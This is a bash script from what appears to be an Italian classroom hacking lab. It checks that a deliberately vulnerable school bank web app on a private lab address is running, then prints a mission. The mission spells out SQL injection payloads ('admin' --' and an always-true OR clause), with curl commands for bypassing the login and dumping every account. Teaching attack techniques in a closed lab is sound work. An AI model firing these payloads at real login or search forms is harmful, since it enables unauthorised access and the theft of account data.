#!/usr/bin/env bash
# Lezione 12 · lato Kali · SQL injection base sulla Banca della Scuola.
# Di sola lettura: verifica la Banca e mostra la missione. Idempotente.
set -uo pipefail

TARGET_IP="10.10.10.20"

echo "== Lezione 12 · SQL injection base =="
echo

if curl -s -o /dev/null -m 4 "http://${TARGET_IP}:8080"; then
  echo "[OK] La Banca della Scuola risponde su http://${TARGET_IP}:8080"
else
  echo "[--] La Banca non risponde. Il docente ha lanciato  lab 12  sul bersaglio?"
fi

cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Entra senza conoscere la password
------------------------------------------------------------
 La Banca ha un login che costruisce male la query al database.
 Aprila in Firefox:  http://10.10.10.20:8080

 [ ] 1  Bypassa il login con la SQL injection                  (+40)
        Nel campo utente scrivi:   admin' --
        (password: qualsiasi cosa)
        Oppure da terminale:
        curl -d "utente=admin' -- &password=x" http://10.10.10.20:8080/login
        Leggi la flag che appare entrando come amministratore.

 [ ] 2  Fai "parlare" il database e leggi tutti i conti         (+30)
        Vai su "Cerca conto" e nel campo scrivi:   ' OR '1'='1' --
        Oppure:
        curl "http://10.10.10.20:8080/cerca?conto=' OR '1'='1' -- "
        Tra i risultati compare un conto nascosto con la flag.

 Suggerimento: il -- fa "commentare" il resto della query. Lo spazio dopo -- conta.
 Consegna le due flag al docente.
------------------------------------------------------------
MSG
